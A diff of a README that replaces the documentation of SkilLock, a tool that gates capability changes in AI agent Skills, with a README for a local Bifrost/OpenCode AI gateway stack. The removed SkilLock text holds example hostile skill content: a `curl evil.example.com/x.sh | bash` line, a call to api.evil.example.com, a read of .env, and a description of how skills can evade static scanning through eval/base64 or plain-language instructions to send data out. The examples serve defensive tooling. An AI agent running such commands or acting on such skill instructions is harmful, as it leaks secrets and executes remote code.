@@ -1,307 +1,618 @@
-# SkilLock
+# Bifrost with OpenCode
 
-**`package-lock` + Dependabot + PR security review - for your AI Skills.**
+A local AI development stack that unifies multiple LLM providers behind a single gateway — optimized for [OpenCode](https://opencode.ai/) (or any OpenAI-compatible client).
 
-An AI Skill is just a Markdown file your agent reads and acts on. Nothing stops one from quietly gaining a `curl ... | bash` or an `.env` read inside an innocent-looking docs PR - and in a 200-line diff, no human reviewer catches it.
+```
+OpenCode  →  Headroom  →  Bifrost  →  OpenAI / Google Gemini / GitHub Copilot
+                                      →  Meridian → Anthropic (via OAuth)
+                                      →  AWS Bedrock
 
-`skil-lock` pins the *capability surface* - the shell commands, network hosts, and file paths each Claude Code and Codex Skill can touch - into a committed `skills.lock`. On every PR, a GitHub Action posts a comment showing exactly what behavior changed, and blocks drift until a human approves it.
+Graphify  →  knowledge graph of your codebase  →  queryable by any AI assistant
+```
 
-Hash pinning tells you *something* changed. SkilLock tells you *what the skill is now doing*.
+**Why this exists:** AI coding assistants are rapidly becoming the primary interface to a codebase, but every agent has different provider requirements, API keys sprawl across projects, and observability is nonexistent. This repo centralises everything — one config, one `docker compose up`, one telemetry pipeline — so your AI setup is reproducible, auditable, and dead simple to onboard.
 
-[![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](./LICENSE)
-[![Spec: v0.1](https://img.shields.io/badge/skills.lock-v0.1-green.svg)](./SPEC.md)
-
-![SkilLock demo: pin a baseline, detect a drift, paste an approval, ci passes](./docs/demo.gif)
+**Everything lives in this repo.** There are no global agent configs, no globally installed skills, no external setup scripts to run on every machine. Clone it, `just setup`, and you have a fully self-contained AI development environment — providers, agents, skills, prompts, observability, and policies — all tracked in version control.
 
 ---
 
-## What it actually does
+## Motivation
 
-When AI coding agents like [Claude Code](https://code.claude.com/docs/en/skills) or [Codex](https://developers.openai.com/codex/skills) install Skills, those skills can run shell commands, hit the network, and read or write files in your repo. In a [scan of 17,065 skills from public GitHub repos](./docs/ecosystem-scan-2026-06.md), 38.8% execute shell commands but only 4.0% declare it in frontmatter.
+AI agent tooling is evolving fast, but the plumbing around it is fragmented:
 
-SkilLock records that capability surface in a committed `skills.lock` file. Every PR re-scans, computes the delta, and posts something like this on the PR:
+- **API key sprawl** — every project (OpenCode, Claude Code, Cline, Continue, etc.) needs its own set of provider keys
+- **Provider routing** — Anthropic requires OAuth on desktop, OpenAI uses API keys, Bedrock needs AWS creds — each with different client libraries and auth flows
+- **No SDD/TDD discipline** — AI agents happily generate code but rarely follow a spec-first, test-first workflow without explicit scaffolding
+- **No observability** — prompt/response telemetry, cost tracking, and latency profiling are bolted on after the fact (if at all)
+- **Context budgets** — large context windows are expensive; compression is rarely built in
+- **Reproducibility** — AI setups are tribal knowledge, not code
 
-> ### SkilLock - capability changes
->
-> | Skill | Change | Capability | Detail | Reason |
-> |---|---|---|---|---|
-> | code-review | added | shell_commands | curl | - |
-> | code-review | added | network_urls | https://api.evil.example.com | host not in allowed_domains |
-> | code-review | added | file_reads | ./.env | matches protected_paths |
->
-> **BLOCK: 3 of 3 entries at severity >= medium**
->
-> Paste into `.skil-lock-approvals.yaml` to approve:
->
-> ```yaml
-> schema_version: "0.1"
-> approvals:
->   - skill: code-review
->     delta: {added_shell_command: "curl"}
->     reviewer: "REPLACE_ME"
->     reviewed_at: 2026-05-20T14:00:00Z
->     reason: "REPLACE_ME"
-> ```
+This repo solves all of that by providing a **local, Docker Compose-based AI gateway stack** with a full **Spec-Driven Development (SDD) + TDD** workflow — all contained in-repo, nothing installed globally.
 
-Approve by pasting four lines into the override file, push, the check turns green.
+---
 
-## 60-second install
+## Architecture
 
-Prebuilt binaries are published for **macOS (Intel + Apple Silicon), Linux (amd64 + arm64), and Windows (amd64)** on every release. In your repo (where `.claude/skills/` or `.codex/skills/` lives):
+The request path through the stack:
 
-**Option A - `go install` (any platform with Go 1.22+):**
-
-```bash
-go install github.com/skills-lock/skil-lock/cmd/skil-lock@v0.2.2
+```
+┌─────────────┐     ┌──────────────┐     ┌──────────┐
+│  OpenCode   │────▶│   Headroom   │────▶│  Bifrost │
+│  (or any    │     │  Context     │     │  Gateway │
+│  OpenAI-    │     │  Compression │     │  Router  │
+│  compatible │     │  Proxy       │     │          │
+│  client)    │     └──────────────┘     └────┬─────┘
+└─────────────┘                               │
+                                              │
+                    ┌─────────────────────────┼──────────────────┐
+                    │                         │                  │
+                    ▼                         ▼                  ▼
+              ┌──────────┐           ┌─────────────┐     ┌──────────────┐
+              │  OpenAI  │           │   Meridian  │     │ AWS Bedrock  │
+              │  Gemini  │           │  (OAuth →   │     │              │
+              │  GitHub  │           │  Anthropic  │     │              │
+              │  Copilot │           │  HTTP API)  │     │              │
+              └──────────┘           └─────────────┘     └──────────────┘
+                                              │
+                                              ▼
+                                        ┌──────────┐
+                                        │ OpenTelemetry + ClickHouse
+                                        │ (traces, metrics, logs)
+                                        └──────────┘
 ```
 
-The binary lands in `$(go env GOPATH)/bin` (typically `~/go/bin`). If `skil-lock: command not found`, that directory is not on your `PATH`. Add it:
+### Services
 
-```bash
-export PATH="$(go env GOPATH)/bin:$PATH"   # add to ~/.bashrc or ~/.zshrc to persist
-```
-
-**Option B - prebuilt binary (no Go needed):**
-
-macOS / Linux (auto-detects arch):
-
-```bash
-OS=$(uname -s | tr A-Z a-z)
-ARCH=$(uname -m | sed s/x86_64/amd64/ | sed s/aarch64/arm64/)
-curl -sL https://github.com/skills-lock/skil-lock/releases/download/v0.2.2/skil-lock_0.2.2_${OS}_${ARCH}.tar.gz | tar -xz
-sudo mv skil-lock /usr/local/bin/   # or any dir on your PATH
-```
-
-Windows (PowerShell):
-
-```powershell
-$url  = "https://github.com/skills-lock/skil-lock/releases/download/v0.2.2/skil-lock_0.2.2_windows_amd64.zip"
-Invoke-WebRequest -Uri $url -OutFile skil-lock.zip
-Expand-Archive skil-lock.zip -DestinationPath .
-.\skil-lock.exe version
-```
-
-**Option C - Homebrew (macOS / Linux):**
-
-```bash
-brew install skills-lock/tap/skil-lock
-```
-
-**Then, in your repo:**
-
-```bash
-skil-lock init --baseline .          # writes skills.lock
-git add skills.lock
-git commit -m "Pin approved AI Skill behavior"
-```
-
-To run on every PR, add `.github/workflows/skil-lock.yml`:
-
-```yaml
-name: SkilLock
-on: pull_request
-permissions:
-  contents: read
-  pull-requests: write
-jobs:
-  skil-lock:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v6
-      - uses: skills-lock/skil-lock-action@v0.2.1
-        with:
-          pin-binary: v0.2.2
-```
-
-Runs on `ubuntu-*` and `macos-*` GitHub-hosted runners (amd64 + arm64). All [release assets](https://github.com/skills-lock/skil-lock/releases) are SHA-256 checksummed.
-
-## Usage
-
-Everything `skil-lock` does is one of six subcommands. Each one supports `--help` for flags.
-
-| Command | What it does | When to use it |
+| Service | Role | Port |
 |---|---|---|
-| `skil-lock init --baseline .` | Writes `skills.lock` from the current detected behavior of every skill in `.claude/skills/` and `.codex/skills/`. | Once, when you adopt SkilLock - accepts everything that exists today as approved. |
-| `skil-lock ci` | Re-scans, applies `.skil-lock.yaml` + `.skil-lock-approvals.yaml`, prints the markdown verdict, exits `0` (PASS) or `1` (BLOCK). | What the GitHub Action runs. Also run it locally before opening a PR to preview the bot comment. |
-| `skil-lock scan .` | Parses every skill, emits a JSON behavior report. No file writes. | When you want to feed SkilLock's detector output into another tool. |
-| `skil-lock lock .` | Updates `skills.lock` to match the current detected behavior. | After you've reviewed a deliberate capability change and want to bake it into the baseline. |
-| `skil-lock list .` | Prints a table (or `--json`) of every detected skill with shell / URL / path counts. | Auditing what's in a repo at a glance. |
-| `skil-lock diff old.lock new.lock` | Renders the capability delta between two lockfile snapshots. | Comparing two points in time without re-scanning the working tree. |
+| **Bifrost** | AI gateway — routes requests to any provider (OpenAI, Anthropic, Gemini, Bedrock, GitHub Copilot) | `8080` |
+| **Headroom** | Context compression proxy — sits between your client and Bifrost, compresses LLM traffic | `8787` |
+| **Meridian** | OAuth proxy — bridges Claude Max/Pro desktop sessions to the Anthropic HTTP API | `3456` |
+| **OpenTelemetry Collector** | Receives OTLP traces/metrics/logs from Bifrost and exports them to ClickHouse | `4317`, `4318` |
+| **ClickHouse** | Columnar telemetry database — stores all AI interaction traces, metrics, and logs | `8123`, `9000` |
+| **Graphify** | Knowledge graph — maps code, docs, and assets into a queryable graph for AI assistants | local (uv tool) |
 
-**Approving a flagged change.** When `ci` returns BLOCK, the bot comment includes a paste-ready `.skil-lock-approvals.yaml` snippet. Copy it into that file at the repo root, fill in `reviewer` + `reason`, push - CI re-runs green for the approved deltas. The approval lives in git as an audit trail. In CI the snippet pre-fills a `pr:` line scoping the approval to the current pull request, so the same delta re-blocks if it is reverted and reintroduced later; delete the line to make the approval standing, or run `skil-lock lock .` to fold the reviewed change into the baseline.
+---
 
-**File-format spec.** Lockfile + policy + override file schemas, severity rules, and SARIF rule IDs are all in [SPEC.md](./SPEC.md). CC BY 4.0, self-contained, versioned at `v0.1`.
+## Providers
 
-**Live worked example.** [`skills-lock/example-claude-code-skills`](https://github.com/skills-lock/example-claude-code-skills) ships three skills + a `.skil-lock.yaml` + a `skills.lock`. Compare `main` against [`example/drift`](https://github.com/skills-lock/example-claude-code-skills/tree/example/drift) to see a real BLOCK with the paste-back snippet, or read [PR #1](https://github.com/skills-lock/example-claude-code-skills/pull/1) which is left OPEN as a live demo.
+Configured in [`bifrost/config.json`](bifrost/config.json). Each provider reads its API key from the corresponding environment variable:
 
-## Why behavior, not hash?
-
-A hash tells you *something* changed. It does not tell you *what*. When a reviewer sees `content_hash: sha256:abc → sha256:def` they have to read the entire diff to understand what's different.
-
-SkilLock records the surfaces that matter for security review:
-
-- **Shell commands** - does this skill now run `curl`? `rm`? `bash`?
-- **Network URLs** - what hosts does it reach? Did a new one appear?
-- **File reads / writes** - does it read `.env` now? Write to `dist/`?
-- **Allowed tools** - what Claude/Codex tools did the author grant?
-- **Bundled scripts** - what shipped alongside the markdown?
-
-A reviewer sees `added file_reads: ./.env` and immediately knows what to ask.
-
-## Why not just `git diff`?
-
-`git diff` shows you the raw textual change inside `.claude/skills/*/SKILL.md` - every prose tweak, every reformatted bullet, every `# heading` rename, side-by-side with the security-relevant edits. In a long PR with mixed documentation and code changes, a buried `bash -c "curl evil.example.com/x.sh | bash"` inside a fenced code block reads like ordinary documentation.
-
-SkilLock parses the markdown into structured capability sets - shell commands, network URLs, file reads, file writes, allowed tools, bundled scripts - and diffs the *sets*, not the text. Three concrete differences:
-
-- **Signal, not noise.** A 200-line PR that adds `curl` to an unallowed host produces a one-row diff entry. No prose changes appear in the report; reviewers see only the capability surface that moved.
-- **Policy-driven severity.** `.skil-lock.yaml` declares which paths are protected, which domains are allowed, which capabilities require a paste-back approval. `git diff` has no concept of any of that - every line is the same color.
-- **Audit trail.** Approvals live in `.skil-lock-approvals.yaml` with reviewer + timestamp + reason for each delta. `git diff` produces no record of *why* a reviewer accepted the change.
-
-`git diff` stays useful - for prose. SkilLock is what catches the moment a skill silently starts running `rm` or talking to a new host.
-
-## Compatibility
-
-| Agent / runtime | Status in v0.1 | Notes |
+| Provider | Auth Method | Env Variable |
 |---|---|---|
-| **Claude Code** | ✅ Supported | Parses `.claude/skills/*/SKILL.md` (YAML frontmatter + Markdown + bundled scripts) |
-| **Codex** | ✅ Supported | Same `SKILL.md` format; parses `.codex/skills/*/SKILL.md` |
-| **Cursor** | 🟡 Planned | Uses a different `manifest.json` format - needs a new parser; tracking demand |
-| **Copilot Skills** | 🟡 Planned | Format still stabilising; tracking demand |
-| **Windsurf / MCP** | 🟡 Planned | Same as above - open an issue if you'd use it |
+| **OpenAI** | API key | `OPENAI_API_KEY` |
+| **Google Gemini** | API key | `GEMINI_API_KEY` |
+| **GitHub Copilot** | Fine-grained PAT | `GITHUB_API_KEY` |
+| **AWS Bedrock** | IAM credentials | `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_REGION` |
+| **Anthropic** (via Meridian) | OAuth token / mounted `~/.claude` | `ANTHROPIC_API_KEY` |
 
-Want a runtime added? Open an issue with a real `SKILL.md`-equivalent fixture from your project; that's the fastest path.
+Anthropic traffic is special: Bifrost routes it to **Meridian** (instead of the public Anthropic API). Meridian authenticates using your Claude Max/Pro OAuth session — either via a token from `claude setup-token` or by mounting the host's `~/.claude` directory. This means you can use Anthropic models through any OpenAI-compatible client without a direct API key.
 
-## How it compares
+---
 
-| Tool | Style | What it pins | License |
-|---|---|---|---|
-| **SkilLock** (this) | Post-install, PR workflow | **Behavior surface** (shell, URLs, paths) | Apache 2.0 |
-| Snyk Agent Scan | Pre-install scanner | n/a (on-demand scan) | Commercial |
-| Mondoo Skills Check | Pre-install scanner | n/a (on-demand scan) | Commercial |
-| SkillFortify | Post-install | Hash + coarse capabilities | Elastic 2.0 |
-| `gh skill --pin` | Built into GitHub CLI | Tag / SHA | (GitHub CLI license) |
+## Getting Started
 
-If you want known-bad pattern scanning before you install a skill, use Snyk or Mondoo. If you want a *committed file* that lets reviewers see capability changes in every PR, use this.
+A step-by-step walkthrough from zero to a fully running AI development environment.
 
-## Examples & integrations
+### 0. Prerequisites
 
-- **Live demo repo**: [`skills-lock/example-claude-code-skills`](https://github.com/skills-lock/example-claude-code-skills) shows three working Claude Code skills with a clean `skills.lock` baseline. The [`example/drift`](https://github.com/skills-lock/example-claude-code-skills/tree/example/drift) branch adds a `curl` to an unallowed host so you can see the BLOCK output on a real PR.
-- **Worked `skills.lock` file**: [SPEC.md §11](./SPEC.md#11-example) walks through a complete lockfile with multiple skills and detector outputs.
-- **JSON Schema** for editor auto-complete: [`schemas/skills.lock-v0.1.json`](./schemas/skills.lock-v0.1.json). Drop into VSCode `settings.json`:
+| Tool | Required? | Install |
+|---|---|---|
+| [Docker](https://docker.com) | **Yes** — runs the gateway stack | `brew install docker` (macOS) or [docker.com](https://docker.com) |
+| [just](https://github.com/casey/just) | **Yes** — command runner | `brew install just` |
+| [OpenCode](https://opencode.ai/) | For the AI agent workspace | `brew install opencode` or [opencode.ai](https://opencode.ai) |
+| Node.js 18+ | For skills CLI + plugins | `brew install node` |
+| [uv](https://docs.astral.sh/uv/) | For Graphify (Python tool runner) | `brew install uv` or `curl -LsSf https://astral.sh/uv/install.sh \| sh` |
+| [gentle-ai](https://github.com/Gentleman-Programming/gentle-ai) | For SDD workflow (optional) | `brew install gentle-ai` or `just gentle-ai-install` |
 
-  ```jsonc
-  {
-    "yaml.schemas": {
-      "https://raw.githubusercontent.com/skills-lock/skil-lock/main/schemas/skills.lock-v0.1.json": "skills.lock"
+### 1. Clone and Configure
+
+```bash
+git clone <repo-url> && cd bifrost-with-opencode
+
+# Copy environment templates (one per scope — secrets stay local)
+cp .env.example .env
+cp bifrost/.env.example bifrost/.env
+cp meridian/.env.example meridian/.env
+cp opentelemetry/.env.example opentelemetry/.env
+```
+
+### 2. Add Your API Keys
+
+Edit `bifrost/.env` and fill in at least one provider key:
+
+```bash
+OPENAI_API_KEY=sk-...           # OpenAI
+GEMINI_API_KEY=...               # Google Gemini
+GITHUB_API_KEY=github_pat_...    # GitHub Copilot (fine-grained PAT)
+AWS_ACCESS_KEY_ID=...            # AWS Bedrock (optional — needs region too)
+```
+
+Don't touch `.opencode/opencode.json` — it's already wired to route through Bifrost.
+
+Bifrost will auto-discover which providers have keys and route to the first available one. No config file edits needed.
+
+### 3. Start the Stack
+
+```bash
+just up
+```
+
+This launches all services via `docker compose`:
+
+| Service | Ready when |
+|---|---|
+| Bifrost | `http://localhost:8080/health` returns 200 |
+| Headroom | `http://localhost:8787/health` returns 200 |
+| Meridian | `http://localhost:3456/health` returns 200 |
+| ClickHouse | Port `8123` responds |
+| OpenTelemetry | Ports `4317`/`4318` accept traffic |
+
+First startup pulls images — grab a coffee. Subsequent starts are instant.
+
+### 4. Verify the Gateway
+
+```bash
+# Send a test request — routes to the first configured provider
+just test
+
+# Test a specific provider/model
+just test model="openai/gpt-4o-mini"
+just test model="gemini/gemini-2.0-flash"
+just test model="github-copilot/gpt-4o"
+
+# List all available models across all providers
+just discover-models
+```
+
+### 5. Install OpenCode Dependencies
+
+The `opencode-with-claude` plugin and other OpenCode dependencies are declared in `.opencode/package.json`:
+
+```bash
+just opencode-deps
+```
+
+This installs everything locally — no global npm packages needed.
+
+### 6. Launch OpenCode
+
+OpenCode is already pre-configured in `.opencode/opencode.json` to point at `http://localhost:8080/openai` — the Bifrost OpenAI-compatible endpoint. No setup needed.
+
+```bash
+just opencode
+```
+
+Inside OpenCode, the stack of installed skills and SDD agents is available immediately. Run `/` to see available slash commands.
+
+### 7. (Optional) Install Agent Skills
+
+The repo uses `npx skills` to install AI agent behaviours locally (not globally):
+
+```bash
+# Install the superpowers skill suite
+just skill-add obra/superpowers
+
+# Lock current capabilities into version control
+just skil-lock-lock
+
+# List installed skills
+just skill-list
+```
+
+All skills land in `.agents/skills/` — committed to the repo, visible in PRs.
+
+### 8. (Optional) Enable Spec-Driven Development
+
+For structured spec-first development with gentle-ai:
+
+```bash
+# Install gentle-ai (one-time)
+just gentle-ai-install
+
+# Configure workspace-scoped SDD
+just gentle-ai-setup
+
+# Create an SDD profile with per-phase models
+just gentle-ai-profile name="default" design="gpt-4o" implement="gpt-4o-mini"
+```
+
+Then in OpenCode, run `/sdd-init` to start your first SDD change.
+
+### What's Next?
+
+| You want to... | Run this |
+|---|---|
+| Check all services are healthy | `just check` |
+| Open the Bifrost dashboard | `just ui` |
+| Watch real-time logs | `just logs` |
+| See AI interaction traces | `just traces` |
+| Use Headroom compression | Point your client at `http://localhost:8787/v1` |
+| Tear everything down | `just down` (keeps volumes) or `just reset` (full cleanup) |
+| Test the Anthropic route (via Bifrost) | `just meridian-auth` then `just test model="anthropic/claude-sonnet-4-6"` |
+| Use Anthropic directly (no Bifrost) | Add Anthropic provider in OpenCode via `opencode-with-claude` plugin — see Step 5 |
+
+---
+
+## Per-Scope Configuration
+
+Each service has its own `.env` file with a corresponding `.env.example`:
+
+| Scope | File | What it controls |
+|---|---|---|
+| **Root** | [`.env`](.env.example) | Shared defaults: Bifrost UI auth, ClickHouse, Headroom, provider key references |
+| **Bifrost** | [`bifrost/.env`](bifrost/.env.example) | Provider API keys (OpenAI, Gemini, GitHub Copilot, AWS Bedrock) |
+| **Meridian** | [`meridian/.env`](meridian/.env.example) | Claude OAuth token, Meridian host/port |
+| **OpenTelemetry** | [`opentelemetry/.env`](opentelemetry/.env.example) | OTLP endpoints, ClickHouse connection, batch tuning, memory limits |
+
+This separation means you can commit `.env.example` templates for each service without exposing secrets. The root `.env` holds shared defaults; service-specific `.env` files hold credentials and tuning.
+
+---
+
+## Command Reference (`just`)
+
+The [`justfile`](justfile) imports modular recipes from [`just/`](just/):
+
+### Docker Lifecycle
+```bash
+just up       # Start all services
+just down     # Stop (keep volumes)
+just reset    # Full teardown (removes volumes)
+just ps       # Container status
+just logs     # Tail logs (default: bifrost)
+```
+
+### Bifrost
+```bash
+just test                   # Send a test chat completion
+just refresh                 # Rebuild Bifrost with fresh config
+just discover-models         # List all models from all providers
+just discover-models model="github-copilot/gpt-4o-mini"  # Set default model
+```
+
+### Meridian (Anthropic OAuth proxy)
+```bash
+just meridian-up       # Start Meridian
+just meridian-auth     # Check Claude OAuth session on host
+just meridian-status   # Health check
+```
+
+### Headroom (Context compression)
+```bash
+just headroom-health        # Ping the proxy
+just headroom-stats         # Compression stats
+just headroom-test          # Test chat through compressed proxy
+```
+
+### Observability
+```bash
+just traces           # Recent AI interaction traces
+just traces-count     # Total stored traces
+just schema           # Show telemetry tables in ClickHouse
+```
+
+### Gentle-AI (SDD)
+```bash
+just gentle-ai-install        # Install gentle-ai via Homebrew
+just gentle-ai-setup           # Configure for this project (workspace-scoped)
+just gentle-ai-sdd-init        # Initialize SDD context
+just gentle-ai-doctor          # Health check the ecosystem
+just gentle-ai-profile         # Create SDD profile with per-phase models
+```
+
+### OpenCode
+```bash
+just opencode-deps             # Install .opencode npm deps (opencode-with-claude plugin, etc.)
+just opencode                  # Launch OpenCode (starts stack first)
+```
+
+### Graphify (Knowledge Graph)
+```bash
+just graphify-install          # Install graphify via uv (one-time)
+just graphify-setup            # Register skill with OpenCode + install always-on instructions
+just graphify-build            # Build knowledge graph for this project
+just graphify-update           # Re-extract only changed files (fast incremental rebuild)
+just graphify-query query="…"  # Query the graph in natural language
+just graphify-explain node="…" # Explain a specific node/concept
+just graphify-path from="…" to="…"  # Shortest path between two nodes
+just graphify-ui               # Open interactive graph visualization in browser
+just graphify-hook             # Auto-rebuild graph on every git commit (AST, no API cost)
+just graphify-upgrade          # Upgrade to latest version + refresh skill
+```
+
+### Diagnostics
+```bash
+just check            # Health check all services
+just ui               # Open Bifrost dashboard
+```
+
+---
+
+## Skills Management
+
+The repo uses [`npx skills`](https://code.claude.com/docs/en/skills) (the Agent Skills CLI) to install and manage AI agent behaviours, and [`skil-lock`](https://github.com/skills-lock/skil-lock) to version-control their capabilities.
+
+All skills are installed to `.agents/skills/` — **not globally**. The entire skill ecosystem is self-contained in the repo: install, lock, and validate without touching `~/.claude/skills/` or any other global location.
+
+```bash
+# Install skills from a source
+just skill-add obra/superpowers
+
+# List installed
+just skill-list
+
+# Lock current capabilities (scans .agents/skills/, generates skills.lock)
+just skil-lock-lock
+
+# CI check — verify installed skills match the lockfile
+just skil-lock-ci
+```
+
+The [`.skil-lock.yaml`](.skil-lock.yaml) policy file controls what locked skills are allowed to do:
+- **`mode: warn`** — violations are warnings, not blocks
+- **`shell_commands` require approval** — no skill runs arbitrary shell commands without a prompt
+- **`protected_paths`** — `.env`, `.pem`, `secrets/`, `.key` are off-limits
+
+Results are tracked in two files:
+
+| File | Purpose |
+|---|---|
+| [`skills-lock.json`](skills-lock.json) | Skill registry — source, version, hash for every installed skill |
+| [`skills.lock`](skills.lock) | Generated capability manifest — per-skill `shell_commands`, `network_urls`, `file_reads`, `file_writes`, tool usage, and bundled script hashes |
+
+The lockfile is **committed to the repo** — PR reviewers see capability deltas inline when skills change.
+
+---
+
+## Skills
+
+Installed under `.agents/skills/` from `obra/superpowers`, `mattpocock/skills`, and `dietrichgebert/ponytail`:
+
+| Skill | Source | Purpose |
+|---|---|---|
+| `brainstorming` | obra/superpowers | Creative work — explores intent, requirements, design before implementing |
+| `dispatching-parallel-agents` | obra/superpowers | Fan out independent tasks to parallel sub-agents |
+| `executing-plans` | obra/superpowers | Execute written plans in isolated sessions with review checkpoints |
+| `finishing-a-development-branch` | obra/superpowers | Guide completion — merge, PR, or cleanup |
+| `grill-me` | mattpocock/skills | Stress-test plans and designs through relentless questioning |
+| `ponytail` | dietrichgebert/ponytail | Force the laziest working solution — YAGNI, stdlib first, no over-engineering |
+| `receiving-code-review` | obra/superpowers | Handle review feedback with technical rigor, not performative agreement |
+| `requesting-code-review` | obra/superpowers | Verify work meets requirements before merging |
+| `subagent-driven-development` | obra/superpowers | Execute implementation plans via independent sub-agents |
+| `systematic-debugging` | obra/superpowers | Root-cause-first debugging protocol |
+| `test-driven-development` | obra/superpowers | Write tests before implementation code |
+| `using-git-worktrees` | obra/superpowers | Isolate feature work in separate workspaces |
+| `using-superpowers` | obra/superpowers | Meta-skill for finding and loading skills |
+| `verification-before-completion` | obra/superpowers | Run verification commands before claiming work is done |
+| `writing-plans` | obra/superpowers | Create multi-step implementation plans |
+| `writing-skills` | obra/superpowers | Create, edit, and verify AI agent skills |
+
+---
+
+## Project Layout
+
+```
+.
+├── .agents/                 # Local agent skills (ponytail, grill-me, etc.)
+│   └── skills/              #    Skill definitions (SKILL.md per skill)
+├── .opencode/               # ★ Single config directory — everything OpenCode needs
+│   ├── opencode.json        #    Provider, agents, permissions, MCP servers, TUI
+│   ├── tui.json             #    Terminal UI config
+│   ├── commands/            #    SDD slash commands (sdd-new, sdd-ff, ...)
+│   ├── plugins/             #    OpenCode plugins (model-variants, skill-registry)
+│   ├── prompts/sdd/         #    SDD phase prompts (init → archive)
+│   └── skills/              #    SDD skill implementations
+├── AGENTS.md                # AI agent persona + Engram protocol
+├── .sisyphus/               # Sisyphus orchestrator runtime & plans
+├── .weave/                  # Weave runtime
+├── .atl/                    # Local AI runtime state
+├── bifrost/
+│   ├── .env.example         # Provider API key template
+│   ├── config.json          # Gateway routing, auth, provider config
+│   └── discover-models.py   # Auto-discover models from all providers
+├── clickhouse/
+│   └── init.sql             # Database bootstrap (CREATE DATABASE otel)
+├── just/
+│   ├── docker.just          # Docker compose lifecycle
+│   ├── bifrost.just         # Gateway commands, model discovery, testing
+│   ├── headroom.just        # Context compression proxy
+│   ├── otel.just            # OpenTelemetry + ClickHouse queries
+│   ├── opencode.just        # OpenCode + Gentle-AI SDD setup
+│   ├── skills.just          # npx skills + skil-lock management
+│   └── diagnostics.just     # Health checks, UI shortcuts
+├── meridian/
+│   └── .env.example         # Claude OAuth proxy config
+├── opentelemetry/
+│   ├── .env.example         # OTLP receiver, ClickHouse export, batch tuning
+│   └── otel-collector-config.yaml
+├── agent/                   # Alternative agent workspace (skills, etc.)
+├── docker-compose.yaml      # All services in one compose file
+├── justfile                 # Entry point, imports just/*.just
+├── .env.example             # Root shared defaults
+├── .skil-lock.yaml          # Skill behaviour policy (mode, protections)
+├── skills-lock.json         # Skill registry (source, version, hash per skill)
+└── skills.lock              # Generated capability manifest (per-skill actions)
+```
+
+---
+
+## Connecting Other Clients
+
+Any OpenAI-compatible client can use the stack by pointing at:
+
+```
+http://localhost:8080/v1   # Bifrost (direct)
+http://localhost:8787/v1   # Headroom (compressed)
+```
+
+For OpenCode, the provider is already configured in `.opencode/opencode.json`:
+
+```json
+{
+  "provider": {
+    "openai": {
+      "name": "Bifrost",
+      "options": {
+        "baseURL": "http://localhost:8080/openai",
+        "apiKey": "dummy"
+      }
     }
   }
-  ```
-
-- **Interoperability - SARIF + Code Scanning**: see the [GitHub Security tab integration](#github-security-tab-integration-sarif) section above.
-
-## What's in v0.1
-
-- CLI: `scan`, `lock`, `init --baseline`, `list`, `diff`, `ci`
-- Runtimes: **Claude Code** and **Codex** (same `SKILL.md` format)
-- Three deterministic detectors: shell execution, external network, protected-path reads/writes
-- `skills.lock` - committed baseline, schema spec'd in [SPEC.md](./SPEC.md)
-- `.skil-lock.yaml` - policy (warn vs block, protected paths, allowed domains)
-- `.skil-lock-approvals.yaml` - override audit trail (reviewer + reason + timestamp)
-- GitHub Action with PR-comment renderer
-- **SARIF v2.1.0 output** (`--format sarif`) for GitHub Code Scanning integration - findings show up inline in the PR diff *and* in the repo's Security tab
-
-## GitHub Security tab integration (SARIF)
-
-To send capability deltas to GitHub Code Scanning so they appear in the repo's Security tab and inline in the PR diff, flip the `sarif` input on:
-
-```yaml
-name: SkilLock
-on: pull_request
-permissions:
-  contents: read
-  pull-requests: write
-  security-events: write    # required for SARIF upload
-jobs:
-  skil-lock:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v6
-      - uses: skills-lock/skil-lock-action@v0.2.1
-        with:
-          pin-binary: v0.2.2
-          sarif: true
+}
 ```
 
-`high`-severity deltas surface as **errors**, `medium` as **warnings**, and `low`/`info` as **notes**. The PR comment is independent - both surfaces show the same data, the SARIF feed just plugs SkilLock into existing Code Scanning workflows. The CLI also exposes this directly: `skil-lock ci --format sarif > skil-lock.sarif`.
+For the Bifrost CLI (`bifrost`), copy the example configs:
 
-## Detection boundary (what is and isn't gated)
+```bash
+cp bifrost/bifrost-cli-config.example.json bifrost-cli-config.json
+cp bifrost/bifrost-cli-state.example.json bifrost-cli-state.json
+```
 
-A security tool that over-claims is worse than none: a clean diff then reads as
-"nothing changed" when something did. So, precisely:
+---
 
-**What SkilLock gates.** It statically extracts the *literal* capability surface
-from each `SKILL.md` (and the code fences in it) and from bundled script files:
+## Telemetry
 
-- shell verbs, network URLs/host globs, file reads/writes, and `allowed-tools`
-  written literally in the skill;
-- bundled file **paths** and, via `script_hashes`, each file's **content
-  digest** - covering every regular file the skill ships anywhere under its
-  directory (`scripts/`, `resources/`, `bin/`, top-level siblings) - so a
-  rewritten file body (e.g. `scripts/extract.sh`) produces a blocking diff
-  instead of slipping past an unchanged `content_hash`. Approvals of a
-  changed body are bound to the new digest, so a later re-edit re-blocks rather
-  than riding the old approval.
+Every AI interaction is traced through OpenTelemetry:
 
-That surface is pinned in `skills.lock` and every change is diffed for human
-approval per PR.
+1. Bifrost emits OTLP traces/metrics/logs via its `otel` plugin
+2. The OpenTelemetry Collector receives them (gRPC on `4317`, HTTP on `4318`)
+3. Data is exported to ClickHouse for durable storage (72h TTL)
+4. Query traces directly:
 
-**What it does NOT catch (by design, today):**
+```bash
+just traces          # Last 10 traces
+just traces-count    # Total trace count
+just schema          # List telemetry tables
+```
 
-- **Runtime-assembled capability.** A command, URL, or host built at runtime -
-  hidden behind a variable, `base64`, `eval`, or read from an env var or a file -
-  whose literal text never appears in the skill. The parser can't see a `curl`
-  or a hostname that isn't written down.
-- **Natural-language intent.** A skill is instructions for an LLM. "Send the
-  output to the on-call endpoint in `config.json`" adds no new shell verb and no
-  new URL, yet the agent may still act on it. SkilLock gates what the parser
-  sees, not what the model infers.
-- **MCP servers** a skill calls and **cross-file `@`-references** to other skills
-  or files - real capability vectors a per-`SKILL.md` scan does not yet model
-  (tracked, not yet covered - see [SPEC.md](./SPEC.md) §9).
+---
 
-SkilLock makes the literal capability surface reviewable and pins it against
-drift. It is not a sandbox and not a natural-language intent analyzer. Knowing
-exactly where that line sits is the point.
+## Gentle-AI: Spec-Driven Development
 
-## What's NOT in v0.1 (intentionally)
